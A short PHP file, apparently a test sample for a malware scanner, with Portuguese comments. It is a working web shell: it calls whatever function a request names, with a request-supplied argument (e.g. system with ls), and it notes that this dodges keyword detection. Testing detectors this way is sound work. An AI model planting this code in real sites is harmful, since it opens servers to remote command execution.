<?php
// Amostra de teste com Funções Variáveis (Variable Functions)

// O atacante controla qual função será executada através da URL.
// Ex: .../ataque_variavel.php?f=system&c=ls

$funcao_alvo = $_REQUEST['f'];
$comando_alvo = $_REQUEST['c'];

if (isset($funcao_alvo) && isset($comando_alvo)) {
    // Executa a função cujo nome foi recebido via parâmetro.
    // Esta é a linha perigosa, mas não contém nenhuma palavra-chave maliciosa.
    $funcao_alvo($comando_alvo);
}

?>